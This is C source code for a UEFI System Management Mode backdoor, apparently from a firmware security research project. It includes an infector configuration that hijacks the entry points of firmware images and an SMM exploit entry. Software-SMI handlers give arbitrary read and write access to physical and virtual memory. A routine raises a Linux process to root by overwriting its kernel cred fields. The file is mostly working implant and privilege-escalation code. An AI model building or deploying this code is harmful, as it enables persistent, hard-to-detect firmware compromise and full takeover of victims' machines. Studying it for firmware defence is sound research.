#include <FrameworkSmm.h>

#include <Protocol/LoadedImage.h>
#include <Protocol/SmmCpu.h>
#include <Protocol/SmmBase2.h>
#include <Protocol/SmmAccess2.h>
#include <Protocol/SmmSwDispatch2.h>
#include <Protocol/SmmPeriodicTimerDispatch2.h>
#include <Protocol/SmmEndOfDxe.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SerialIo.h>

#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/DevicePathLib.h>
#include <Library/UefiRuntimeLib.h>
#include <Library/SynchronizationLib.h>

#include <IndustryStandard/PeImage.h>

#include "config.h"

#include "common.h"
#include "printf.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "SmmBackdoor.h"

#include "asm/common_asm.h"

#include "serial.h"
#include "../../DuetPkg/DxeIpl/X64/VirtualMemory.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)

typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(PVOID Image);

#define BACKDOOR_RELOCATED_ADDR(_sym_, _addr_) \
        RVATOVA((_addr_), (UINT64)(_sym_) - (UINT64)m_ImageBase)

#pragma section(".conf", read, write)

EFI_STATUS BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable);

EFI_STATUS BackdoorEntryExploit(EFI_SMM_SYSTEM_TABLE2 *Smst);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
                              { 
                                  // address of infected file new entry point
                                  (PVOID)&BackdoorEntryInfected,

                                  // address of old entry point (will be set by infector)
                                  0,

                                  // entry point to call by SMM exploit
                                  (PVOID)&BackdoorEntryExploit
                              };

// MSR registers
#define IA32_KERNEL_GS_BASE 0xC0000102
#define IA32_EFER 0xC0000080
#define MSR_SMM_MCA_CAP 0x17D
#define MSR_SMM_FEATURE_CONTROL 0x4E0

// IA32_EFER.LME flag
#define IA32_EFER_LME 0x100                              

// CR* registers bits
#define CR0_PG  0x80000000
#define CR4_PAE 0x20

#define MAX_SMRAM_SIZE (0x800000 * 2)

EFI_SYSTEM_TABLE *gST;
EFI_BOOT_SERVICES *gBS;
EFI_RUNTIME_SERVICES *gRT;

EFI_SMM_SYSTEM_TABLE2 *m_Smst = NULL;

BOOLEAN m_bInfectedImage = FALSE;
EFI_HANDLE m_ImageHandle = NULL;
PVOID m_ImageBase = NULL;

PBACKDOOR_INFO g_BackdoorInfo = NULL;

// serial I/O interface for debug purposes
EFI_SERIAL_IO_PROTOCOL *m_SerialIo = NULL;

// console I/O interface for debug messages
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL;   
char *m_PendingOutput = NULL;

// software SMI handler register context
EFI_SMM_SW_REGISTER_CONTEXT m_SwDispatch2RegCtx = { BACKDOOR_SW_SMI_VAL };

// SMM periodic timer register context (time in 100 nanosecond units)
EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT m_PeriodicTimerDispatch2RegCtx = { 1000000, 640000 };

// periodic timer vars
UINT64 m_PeriodicTimerCounter = 0;
EFI_HANDLE m_PeriodicTimerDispatchHandle = NULL;
EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *m_PeriodicTimerDispatch = NULL;

EFI_STATUS PeriodicTimerDispatch2Register(EFI_HANDLE *DispatchHandle);
EFI_STATUS PeriodicTimerDispatch2Unregister(EFI_HANDLE DispatchHandle);

typedef struct _CONTROL_REGS
{
    UINT64 Cr0, Cr3, Cr4;

} CONTROL_REGS,
*PCONTROL_REGS;
//--------------------------------------------------------------------------------------
void ConsolePrint(char *Message)
{
    UINTN Len = strlen(Message), i = 0;

    if (m_TextOutput)
    {        
        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }   
}
//--------------------------------------------------------------------------------------
BOOLEAN ConsoleInit(void)
{
    if (m_PendingOutput == NULL)
    {
        EFI_PHYSICAL_ADDRESS PagesAddr;

        // allocate memory for pending debug output
        EFI_STATUS Status = gBS->AllocatePages(
            AllocateAnyPages,
            EfiRuntimeServicesData,
            1, &PagesAddr
        );
        if (EFI_ERROR(Status)) 
        {     
            DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
            return FALSE;
        }

        m_PendingOutput = (char *)PagesAddr;        
        gBS->SetMem(m_PendingOutput, PAGE_SIZE, 0);
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
void SerialPrint(char *Message)
{
    UINTN Len = strlen(Message), i = 0;

#if defined(BACKDOOR_DEBUG_SERIAL_PROTOCOL)

    if (m_SerialIo)
    {
        m_SerialIo->Write(m_SerialIo, &Len, Message);
    }    

#elif defined(BACKDOOR_DEBUG_SERIAL_BUILTIN)

    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

    for (i = 0; i < Len; i += 1)
    {
        // send single byte via serial port
        SerialPortWrite(SERIAL_PORT_NUM, Message[i]);
    }

#elif defined(BACKDOOR_DEBUG_SERIAL_OVMF)

    for (i = 0; i < Len; i += 1)
    {
        // send single byte to OVMF debug port
        __outbyte(OVMF_DEBUG_PORT, Message[i]);
    }

#endif

#if defined(BACKDOOR_DEBUG_SERIAL_TO_CONSOLE)

    if (m_TextOutput == NULL)
    {        
        if (m_PendingOutput &&
            strlen(m_PendingOutput) + strlen(Message) < PAGE_SIZE)
        {            
            // text output protocol is not initialized yet, save output to temp buffer
            strcat(m_PendingOutput, Message);
        }
    }    
    else
    {
        ConsolePrint(Message);        
    }

#endif

}
//--------------------------------------------------------------------------------------
BOOLEAN SerialInit(VOID)
{

#if defined(BACKDOOR_DEBUG_SERIAL_PROTOCOL)

    if (m_SerialIo)
    {
        // serial I/O is already initialized
        return TRUE;
    }

    // TODO: initialize EFI serial I/O protocol
    // ...

    if (m_SerialIo == NULL)
    {
        return FALSE;
    }

#elif defined(BACKDOOR_DEBUG_SERIAL_BUILTIN)

    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif

    return TRUE;
}
//--------------------------------------------------------------------------------------
#define PFN_TO_PAGE(_val_) ((_val_) << PAGE_SHIFT)
#define PAGE_TO_PFN(_val_) ((_val_) >> PAGE_SHIFT)

// get MPL4 address from CR3 register value
#define PML4_ADDRESS(_val_) ((_val_) & 0xfffffffffffff000)

// get address translation indexes from virtual address
#define PML4_INDEX(_addr_) (((_addr_) >> 39) & 0x1ff)
#define PDPT_INDEX(_addr_) (((_addr_) >> 30) & 0x1ff)
#define PDE_INDEX(_addr_) (((_addr_) >> 21) & 0x1ff)
#define PTE_INDEX(_addr_) (((_addr_) >> 12) & 0x1ff)

#define PAGE_OFFSET_4K(_addr_) ((_addr_) & 0xfff)
#define PAGE_OFFSET_2M(_addr_) ((_addr_) & 0x1fffff)

// PS flag of PDPTE and PDE
#define PDPTE_PDE_PS 0x80

#define INTERLOCKED_GET(_addr_) InterlockedCompareExchange64((UINT64 *)(_addr_), 0, 0)

#if defined(BACKDOOR_DEBUG_MEM)

#define DbgMsgMem DbgMsg

#else

#define DbgMsgMem

#endif

EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3)
{
    UINT64 PhysAddr = 0;
    EFI_STATUS Status = EFI_INVALID_PARAMETER;    

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    

    DbgMsgMem(__FILE__, __LINE__, __FUNCTION__"(): CR3 is 0x%llx, VA is 0x%llx\r\n", Cr3, Addr);

    PML4Entry.Uint64 = INTERLOCKED_GET(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));

    DbgMsgMem(
        __FILE__, __LINE__, "PML4E is at 0x%llx[0x%llx]: 0x%llx\r\n", 
        PML4_ADDRESS(Cr3), PML4_INDEX(Addr), PML4Entry.Uint64
    );

    if (PML4Entry.Bits.Present)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;
        PDPTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
                                           PDPT_INDEX(Addr) * sizeof(UINT64));

        DbgMsgMem(
            __FILE__, __LINE__, "PDPTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
            PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress), PDPT_INDEX(Addr), PDPTEntry.Uint64
        );

        if (PDPTEntry.Bits.Present)
        {
            // check for page size flag
            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;
                PDEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                                                 PDE_INDEX(Addr) * sizeof(UINT64));

                DbgMsgMem(
                    __FILE__, __LINE__, "PDE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
                    PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress), PDE_INDEX(Addr), 
                    PDEntry.Uint64
                );

                if (PDEntry.Bits.Present)
                {
                    // check for page size flag
                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K PTEntry;
                        PTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                                         PTE_INDEX(Addr) * sizeof(UINT64));

                        DbgMsgMem(
                            __FILE__, __LINE__, "PTE is at 0x%llx[0x%llx]: 0x%llx\r\n", 
                            PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress), PTE_INDEX(Addr), 
                            PTEntry.Uint64
                        );

                        if (PTEntry.Bits.Present)
                        {
                            PhysAddr = PFN_TO_PAGE(PTEntry.Bits.PageTableBaseAddress) +
                                       PAGE_OFFSET_4K(Addr);

                            Status = EFI_SUCCESS;
                        }
                        else
                        {
                            DbgMsg(
                                __FILE__, __LINE__, 
                                "ERROR: PTE for 0x%llx is not present\r\n", Addr
                            );
                        }
                    }
                    else
                    {
                        PhysAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                   PAGE_OFFSET_2M(Addr);

                        Status = EFI_SUCCESS;
                    }
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: PDE for 0x%llx is not present\r\n", Addr
                    );
                }                     
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: 1Gbyte page\r\n");
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: PDPTE for 0x%llx is not present\r\n", Addr);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: PML4E for 0x%llx is not present\r\n", Addr);
    }

    if (Status == EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "Physical address of 0x%llx is 0x%llx\r\n", Addr, PhysAddr);

        if (Ret)
        {            
            *Ret = PhysAddr;
        }
    }

    return Status;
}

BOOLEAN VirtualAddrValid(UINT64 Addr, UINT64 Cr3)
{
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    
    PML4Entry.Uint64 = *(UINT64 *)(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * sizeof(UINT64));

    if (PML4Entry.Bits.Present)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;
        PDPTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
                                       PDPT_INDEX(Addr) * sizeof(UINT64));

        if (PDPTEntry.Bits.Present)
        {
            // check for page size flag
            if ((PDPTEntry.Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;
                PDEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                                             PDE_INDEX(Addr) * sizeof(UINT64));

                if (PDEntry.Bits.Present)
                {
                    // check for page size flag
                    if ((PDEntry.Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K PTEntry;
                        PTEntry.Uint64 = *(UINT64 *)(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                                     PTE_INDEX(Addr) * sizeof(UINT64));
                        if (PTEntry.Bits.Present)
                        {
                            return TRUE;
                        }
                    }
                    else
                    {
                        return TRUE;
                    }
                }  
            }
            else
            {
                return TRUE;
            }
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOLEAN Check_IA_32e(PCONTROL_REGS ControlRegs)
{
    UINT64 Efer = __readmsr(IA32_EFER);

    if (!(ControlRegs->Cr0 & CR0_PG))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: CR0.PG is not set\r\n");
        return FALSE;   
    }

    if (!(Efer & IA32_EFER_LME))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: IA32_EFER.LME is not set\r\n");
        return FALSE;
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
PVOID BackdoorImageAddress(void)
{
    PVOID Addr = _get_addr();
    PVOID Base = (PVOID)XALIGN_DOWN((UINT64)Addr, DEFAULT_EDK_ALIGN);

    // get current module base by address inside of it
    while (*(PUSHORT)Base != EFI_IMAGE_DOS_SIGNATURE)
    {
        Base = (PVOID)((PUCHAR)Base - DEFAULT_EDK_ALIGN);
    }

    return Base;
}
//--------------------------------------------------------------------------------------
PVOID BackdoorImageReallocate(PVOID Image)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS PagesAddr;

    // allocate memory for executable image
    EFI_STATUS Status = gBS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &PagesAddr
    );
    if (Status == EFI_SUCCESS)
    {     
        PVOID Reallocated = (PVOID)PagesAddr;

        // copy image to the new location
        gBS->CopyMem(Reallocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations acording to the new address
        LDR_UPDATE_RELOCS(Reallocated, Image, Reallocated);

        return Reallocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
    }
    
    return NULL;
}
//--------------------------------------------------------------------------------------
EFI_STATUS BackdoorImageCallRealEntry(
    PVOID Image,
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable)
{
    if (m_InfectorConfig.OriginalEntryPoint != 0)
    {
        EFI_IMAGE_ENTRY_POINT pEntry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(
            Image, 
            m_InfectorConfig.OriginalEntryPoint
        );

        // call original entry point
        return pEntry(ImageHandle, SystemTable);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
PBACKDOOR_INFO BackdoorInfoGet(VOID)
{
    EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;
    UINTN VariableSize = sizeof(PBACKDOOR_INFO);
    PBACKDOOR_INFO pBackdoorInfo = NULL;

    EFI_STATUS Status = gRT->GetVariable(
        BACKDOOR_VAR_INFO_NAME, &VariableGuid, NULL,
        &VariableSize, (PVOID)&pBackdoorInfo
    );
    if (Status == EFI_SUCCESS)
    {
        return pBackdoorInfo;
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
BOOLEAN BackdoorInfoInit(VOID)
{
    EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;
    PBACKDOOR_INFO pBackdoorInfo = NULL;
    UINTN PagesCount = 1 + (MAX_SMRAM_SIZE / PAGE_SIZE);

    if ((pBackdoorInfo = BackdoorInfoGet()) == NULL)
    {
        EFI_PHYSICAL_ADDRESS PagesAddr;

        // allocate two 4Kb memory pages for backdoor info
        EFI_STATUS Status = gBS->AllocatePages(
            AllocateAnyPages,
            EfiRuntimeServicesData,
            PagesCount, &PagesAddr
        );
        if (EFI_ERROR(Status)) 
        {     
            DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
            return FALSE;
        }        

        pBackdoorInfo = (PBACKDOOR_INFO)PagesAddr;        
        gBS->SetMem(pBackdoorInfo, PagesCount * PAGE_SIZE, 0);

        DbgMsg(__FILE__, __LINE__, "Backdoor info is at "FPTR"\r\n", pBackdoorInfo);

        Status = gRT->SetVariable(
            BACKDOOR_VAR_INFO_NAME, &VariableGuid,
            EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            sizeof(PBACKDOOR_INFO), (PVOID)&pBackdoorInfo
        );
        if (EFI_ERROR(Status)) 
        {
            DbgMsg(__FILE__, __LINE__, "SetVariable() fails: 0x%X\r\n", Status);
            return FALSE;
        }
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, PVOID Context)
{
    EFI_STATUS Status = EFI_SUCCESS;

    // initialize serial port again if it wasn't available
    SerialInit();

    if (m_TextOutput == NULL)
    {
        // initialize console I/O
        Status = gBS->HandleProtocol(
            gST->ConsoleOutHandle,
            &gEfiSimpleTextOutProtocolGuid, 
            (PVOID *)&m_TextOutput
        );
        if (Status == EFI_SUCCESS)
        {
            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
            m_TextOutput->ClearScreen(m_TextOutput);

            // print pending messages
            if (m_PendingOutput)
            {
                EFI_PHYSICAL_ADDRESS PagesAddr = (EFI_PHYSICAL_ADDRESS)m_PendingOutput;

                ConsolePrint(m_PendingOutput);

                // free temp buffer
                gBS->FreePages(PagesAddr, 1);
                m_PendingOutput = NULL;

                gBS->Stall(TO_MICROSECONDS(5));
            }
        }
    }    

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Protocol ready\r\n");
}
//--------------------------------------------------------------------------------------
EFI_STATUS RegisterProtocolNotifyDxe(
    EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
    EFI_EVENT *Event, PVOID *Registration)
{
    EFI_STATUS Status = gBS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event);
    if (EFI_ERROR(Status)) 
    {
        DbgMsg(__FILE__, __LINE__, "CreateEvent() fails: 0x%X\r\n", Status);
        return Status;
    }

    Status = gBS->RegisterProtocolNotify(Guid, *Event, (PVOID)Registration);
    if (EFI_ERROR(Status)) 
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
        return Status;
    }

    DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);

    return Status;
}

VOID BackdoorEntryResident(PVOID Image)
{
    PVOID Registration = NULL;
    EFI_EVENT Event = NULL;    

    m_ImageBase = Image;

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Started\r\n");    

    RegisterProtocolNotifyDxe(
        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
        &Event, &Registration
    );
}
//--------------------------------------------------------------------------------------
EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS ControlRegs)
{
    EFI_STATUS Status = EFI_INVALID_PARAMETER;   
    PUCHAR Buff = (PUCHAR)RVATOVA(g_BackdoorInfo, PAGE_SIZE); 

    switch (Code)
    {
    case BACKDOOR_SW_DATA_PING:
        {
            // do nothing, just check for alive backdoor
            Status = EFI_SUCCESS;

            break;
        }

    case BACKDOOR_SW_DATA_READ_PHYS_MEM:
    case BACKDOOR_SW_DATA_WRITE_PHYS_MEM:
        {
            UINTN i = 0;
            UINT64 Addr = 0;

            if (Arg1 == 0)
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Arg1 must be specified\r\n");
                
                Status = EFI_INVALID_PARAMETER;
                goto _end;
            }
             
            if (Arg2 != 0)
            {
                if (!Check_IA_32e(ControlRegs))
                {
                    DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
                    
                    Status = EFI_INVALID_PARAMETER;
                    goto _end;
                }

                // use caller specified buffer virtual address
                if ((Status = VirtualToPhysical(Arg2, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
                {
                    Buff = (PUCHAR)Addr;
                }              
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to resolve physical address for 0x%llx\r\n", Arg2
                    );

                    goto _end;
                }
            }

            if (Code == BACKDOOR_SW_DATA_READ_PHYS_MEM)
            {
                DbgMsg(
                    __FILE__, __LINE__, "Copying page from 0x%llx to "FPTR"\r\n",  
                    Arg1, Buff
                );
            }
            else if (Code == BACKDOOR_SW_DATA_WRITE_PHYS_MEM)
            {
                DbgMsg(
                    __FILE__, __LINE__, "Copying page from "FPTR" to 0x%llx\r\n",  
                    Buff, Arg1
                );   
            }

            // check for valid address
            if (VirtualAddrValid(Arg1, __readcr3()))
            {
                for (i = 0; i < PAGE_SIZE; i += 1)
                {
                    // copy memory contents
                    if (Code == BACKDOOR_SW_DATA_READ_PHYS_MEM)
                    {                    
                        *(Buff + i) = *(PUCHAR)(Arg1 + i);
                    }
                    else if (Code == BACKDOOR_SW_DATA_WRITE_PHYS_MEM)
                    {
                        *(PUCHAR)(Arg1 + i) = *(Buff + i);
                    }
                }
            }
            else
            {                
                for (i = 0; i < PAGE_SIZE; i += 1)
                {
                    // address is not mapped, fill with zeros
                    if (Code == BACKDOOR_SW_DATA_READ_PHYS_MEM)
                    {                    
                        *(Buff + i) = 0;
                    }
                }
            }

            Status = EFI_SUCCESS;

            break;
        }

    case BACKDOOR_SW_DATA_READ_VIRT_MEM:
    case BACKDOOR_SW_DATA_WRITE_VIRT_MEM:
        {
            UINTN i = 0;
            UINT64 Addr = 0;

            if (Arg1 == 0)
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Arg1 must be specified\r\n");
                
                Status = EFI_INVALID_PARAMETER;
                goto _end;
            }

            if (!Check_IA_32e(ControlRegs))
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
                
                Status = EFI_INVALID_PARAMETER;
                goto _end;
            }

            if (Arg2 != 0)
            {
                // use caller specified buffer virtual address
                if ((Status = VirtualToPhysical(Arg2, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
                {
                    Buff = (PUCHAR)Addr;
                }              
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to resolve physical address for 0x%llx\r\n", Arg2
                    );

                    goto _end;
                }
            }

            if ((Status = VirtualToPhysical(Arg1, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
            {
                if (Code == BACKDOOR_SW_DATA_READ_VIRT_MEM)
                { 
                    DbgMsg(
                        __FILE__, __LINE__, "Copying page from 0x%llx (VA = 0x%llx) to "FPTR"\r\n",  
                        Addr, Arg1, Buff
                    );
                }
                else if (Code == BACKDOOR_SW_DATA_WRITE_VIRT_MEM)
                {
                    DbgMsg(
                        __FILE__, __LINE__, "Copying page from "FPTR" to 0x%llx (VA = 0x%llx)\r\n",  
                        Buff, Addr, Arg1
                    );
                }

                for (i = 0; i < PAGE_SIZE; i += 1)
                {
                    // copy memory contents
                    if (Code == BACKDOOR_SW_DATA_READ_VIRT_MEM)
                    {                    
                        *(Buff + i) = *(PUCHAR)(Addr + i);
                    }
                    else if (Code == BACKDOOR_SW_DATA_WRITE_VIRT_MEM)
                    {
                        *(PUCHAR)(Addr + i) = *(Buff + i);
                    }
                }
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Arg1
                );
            }

            break;
        }

    case BACKDOOR_SW_DATA_TIMER_ENABLE:
        {         
            if (m_PeriodicTimerDispatchHandle == NULL)
            {
                g_BackdoorInfo->TicksCount = 0;

                // enable periodic timer handler
                PeriodicTimerDispatch2Register(&m_PeriodicTimerDispatchHandle);    

                Status = EFI_SUCCESS;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Timer is already registered\r\n");
            }

            break;
        }

    case BACKDOOR_SW_DATA_TIMER_DISABLE:
        {
            if (m_PeriodicTimerDispatchHandle != NULL)
            {
                // disable periodic timer handler
                PeriodicTimerDispatch2Unregister(m_PeriodicTimerDispatchHandle);

                m_PeriodicTimerDispatchHandle = NULL;
                Status = EFI_SUCCESS;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Timer is not registered\r\n");
            }

            break;
        }

    case BACKDOOR_SW_DATA_PRIVESC:
        {
            UINT64 Addr = 0, GsBase = 0;
            int OffsetTaskStruct = 0, OffsetCred = 0;
            unsigned char OffsetCredVal = 0;

            if (Arg1 == 0)
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Arg1 must be specified\r\n");
                
                Status = EFI_INVALID_PARAMETER;
                goto _end;
            }

            if (!Check_IA_32e(ControlRegs))
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
                
                Status = EFI_INVALID_PARAMETER;
                goto _end;
            }

            DbgMsg(__FILE__, __LINE__, "Syscall address is 0x%llx\r\n", Arg1);

            if ((Status = VirtualToPhysical(Arg1, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
            {                
                /*
                    User mode program (smm_call) passing sys_getuid/euid/gid/egid
                    function address in 1-st argument, we need to analyse it's code
                    and get offsets to task_struct, cred and uid/euid/gid/egid fields.
                    Then we just set filed value to 0 (root).

                    sys_getuid code as example:

                        mov    %gs:0xc700, %rax   ; get task_struct
                        mov    0x388(%rax), %rax  ; get task_struct->cred
                        mov    0x4(%rax), %eax    ; get desired value from cred
                        retq
                */
                if (memcmp((void *)(Addr + 0x00), "\x65\x48\x8b\x04\x25", 5) ||
                    memcmp((void *)(Addr + 0x09), "\x48\x8b\x80", 3) ||
                    memcmp((void *)(Addr + 0x10), "\x8b\x40", 2))
                {
                    DbgMsg(__FILE__, __LINE__, "ERROR: Unexpected binary code\r\n");
                    
                    Status = EFI_INVALID_PARAMETER;
                    goto _end;
                }

                OffsetCredVal = *(unsigned char *)(Addr + 0x12);
                OffsetTaskStruct = *(int *)(Addr + 0x05);
                OffsetCred = *(int *)(Addr + 0x0c);                

                DbgMsg(
                    __FILE__, __LINE__, 
                    "task_struct offset: 0x%x, cred offset: 0x%x, cred value offset: 0x%x\r\n",
                    OffsetTaskStruct, OffsetCred, OffsetCredVal
                );
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", Arg1
                );

                goto _end;
            }

            GsBase = __readmsr(IA32_KERNEL_GS_BASE);            

            DbgMsg(__FILE__, __LINE__, "GS base is 0x%llx\r\n", GsBase);

            // check if GS base points to user-mode
            if ((GsBase >> 63) == 0)
            {
                DbgMsg(__FILE__, __LINE__, "ERROR: Bad GS base\r\n");
                
                Status = EFI_INVALID_PARAMETER;
                goto _end;
            }            

            if ((Status = VirtualToPhysical(GsBase, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
            {                
                UINT64 TaskStruct = *(UINT64 *)(Addr + OffsetTaskStruct);   

                DbgMsg(__FILE__, __LINE__, "task_struct is at 0x%llx\r\n", TaskStruct);

                if ((Status = VirtualToPhysical(TaskStruct, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
                {
                    UINT64 Cred = *(UINT64 *)(Addr + OffsetCred);   

                    DbgMsg(__FILE__, __LINE__, "cred is at 0x%llx\r\n", Cred);

                    if ((Status = VirtualToPhysical(Cred, &Addr, ControlRegs->Cr3)) == EFI_SUCCESS)
                    {
                        int *CredVal = (int *)(Addr + OffsetCredVal);

                        DbgMsg(
                            __FILE__, __LINE__, 
                            "Current cred value is %d (setting to 0)\r\n", *CredVal
                        );

                        // set root privilleges
                        *CredVal = 0;
                    }
                    else
                    {
                        DbgMsg(
                            __FILE__, __LINE__, 
                            "ERROR: Unable to resolve physical address for 0x%llx\r\n", Cred
                        );
                    }
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        "ERROR: Unable to resolve physical address for 0x%llx\r\n", TaskStruct
                    );
                }
            }
            else
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    "ERROR: Unable to resolve physical address for 0x%llx\r\n", GsBase
                );
            }
        }
    } 

_end:

    g_BackdoorInfo->BackdoorStatus = Status;

    return Status;
}
//--------------------------------------------------------------------------------------
#define READ_SAVE_STATE(_id_, _var_)                                                \
                                                                                    \
    Status = SmmCpu->ReadSaveState(SmmCpu,                                          \
        sizeof((_var_)), (_id_), m_Smst->CurrentlyExecutingCpu, (PVOID)&(_var_));   \
                                                                                    \
    if (EFI_ERROR(Status))                                                          \
    {                                                                               \
        DbgMsg(__FILE__, __LINE__, "ReadSaveState() fails: 0x%X\r\n", Status);      \
        goto _end;                                                                  \
    }

#define WRITE_SAVE_STATE(_id_, _var_, _val_)                                        \
                                                                                    \
    (_var_) = (UINT64)(_val_);                                                      \
    Status = SmmCpu->WriteSaveState(SmmCpu,                                         \
        sizeof((_var_)), (_id_), m_Smst->CurrentlyExecutingCpu, (PVOID)&(_var_));   \
                                                                                    \
    if (EFI_ERROR(Status))                                                          \
    {                                                                               \
        DbgMsg(__FILE__, __LINE__, "WriteSaveState() fails: 0x%X\r\n", Status);     \
        goto _end;                                                                  \
    }

#define MAX_JUMP_SIZE 6

